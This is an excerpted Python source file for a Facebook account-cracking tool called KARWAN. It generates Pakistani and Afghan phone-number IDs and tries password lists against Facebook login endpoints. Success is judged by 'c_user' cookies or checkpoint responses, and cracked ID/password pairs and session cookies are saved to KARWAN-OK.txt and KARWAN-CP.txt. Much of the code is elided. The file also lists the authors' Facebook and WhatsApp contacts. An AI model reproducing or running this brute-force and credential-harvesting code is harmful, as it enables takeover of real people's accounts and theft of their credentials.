...
\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mMURTAZA BAGHLANI & ARASH BADAKHSHI
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m MURTAZA BAGHLANI
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mKARWAN TECH
\033[1;32m  •   \033[1;36mTOOL VIRSION :  \033[1;36m0.8
\033[1;37m══════════════════════════════════════════\n""")
os.system ('clear')

print("\033[1;32m[•] \033[1;33mFOLLOW MY FACEBOOK ID....!");time.sleep(0)
#os.system("xdg-open https://www.facebook.com/Murtaza4044")
def clear ():
	os.system('clear')
	print (logo)
def linex():
...
def c():
	...
	if ok =='1':
		os.system("xdg-open https://wa.me/+93707610644");Main()
	if ok =='2':
		os.system("xdg-open https://www.facebook.com/Murtaza4044");Main()
	if ok =='3':
		print("\033[0;97m USER NAME :\033[0;92m  murtaza._.080 ")
...
def R():
    ...
    os.system('clear')
    print(logo)
    print('[+] PK CODE : 92300,92301,92345\n[+] AFG CODE : 9377,9378,9370,9376,9371,9379     ');print('\033[1;37m(•)══════════════════════════════════════════')
...
def eml():
    ...
    os.system('clear')
    print(logo)
    print("[•] FIRST NAME EXAMPLE : murtaza baghlani...etc \n[•] LAST NAME EXAMPLE : usman,zoya...etc");linex()
...
class Random:
    ...
    def fbtua(self):
        ...
        try:
            ...
            print("%s\n\033[0;97m[+] \033[0;92mOK RESULTS SAVED IN -> KARWAN-OK.txt" % (G))
            print("%s\033[0;97m[+] \033[0;91mCP RESULTS SAVED IN -> KARWAN-CP.txt" % (Y))
            print('\n\033[1;37m(•)══════════════════════════════════════════')
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s\033[0;97m[\033[0;92m K•A•R•W•A•N \033[0;97m]\033[0;97m  %s\033[0;97m/\033[0;92m%s \033[0;97m[\033[0;92mOK\033[0;91m:\033[0;92m%s\033[0;97m]" % (B, self.loop, len(self.id), len(self.cp)));sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;92m[KARWAN-OK] %s √ %s\033[0;97m         " % (uid, pw))
                self.cp.append("%s√%s" % (uid, pw))
                open("KARWAN-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
                break
            else:
                continue
        self.loop += 1
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\33[1;92m[KARWAN-OK] '+uid+' √ '+ps+'\33[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\33[1;91m[KARWAN-CP] '+uid+' • '+ps+'\33[0;97m')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m[K•A•R•W•A•N] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[KARWAN-OK] %s √ %s'%(ids,pas))
                                open(f'/sdcard/KARWAN-OK.txt', 'a').write(ids+' √ '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in cp:
                                        print(f'\r\r\033[1;37m[KARWAN-CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/KARWAN-CP.txt', 'a').write(ids+' • '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
